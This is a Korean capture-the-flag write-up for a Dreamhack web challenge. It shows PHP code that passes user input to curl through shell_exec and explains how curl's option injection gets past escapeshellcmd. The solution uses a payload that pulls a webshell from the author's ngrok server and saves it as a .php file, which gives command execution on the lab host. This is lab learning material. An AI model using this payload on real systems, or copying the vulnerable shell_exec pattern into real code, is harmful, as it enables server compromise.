## 코드

```php
<?php
    if(isset($_GET['url'])){
        $url = $_GET['url'];
        if(strpos($url, 'http') !== 0 ){
            die('http only !');
        }else{
            $result = shell_exec('curl '. escapeshellcmd($_GET['url']));
            $cache_file = './cache/'.md5($url);
            file_put_contents($cache_file, $result);
            echo "<p>cache file: <a href='{$cache_file}'>{$cache_file}</a></p>";
            echo '<pre>'. htmlentities($result) .'</pre>';
            return;
        }
    } else {}
?>
```

## 풀이

입력한 주소에 대해 curl 명령어를 수행하여 결과를 ./cache/{md5} 로 저장하는 코드
내가 입력한 임의 주소에 대해 curl 명령어를 수행하게 되는데,
테스트를 위해 https://google.com을 입력하면 해당 페이지를 GET 해오는 것을 알 수 있다.
이때 escapeshellcmd()를 통해 ;와 같은 문자를 필터링하는데,
escapeshellarg()를 필터링하지 않으므로 -와 같은 옵션 적용이 가능하다. 초반에는 이 부분을 놓치고 진행했었다.

일단 파일을 가져오는 기능이 있기 때문에 이걸 활용해서 웹쉘을 올리면 되겠다고 생각했다.
Github의 raw 파일 기능 및 웹서비스 활용 등 여러 방법이 있을 것이며,
본인은 ngrok + python3 -m http.server 를 활용하여 로컬 PC를 서버로 활용했다.
이 결과 webshell.php를 가져가게끔 하는 것은 성공했는데, cache/{md5} 로 된 파일이다보니 php 확장자가 없어서 명령어 수행이 전혀 되지 않았다.(웹쉘인데 아무것도 안나옴..)
그래서 옵션을 통해 결과를 .php 파일로 저장해야겠다고 생각했고,

```bash
https://000.ngrok.io/webshell.php -o ./cache/webshell.php
```

이런 식으로 페이로드를 작성했다.
그리고 host1.dreamhack.io/cache/webshell.php 로 들어가니 정상적으로 웹쉘이 존재했으며,
명령어 입력 및 실행이 되었다.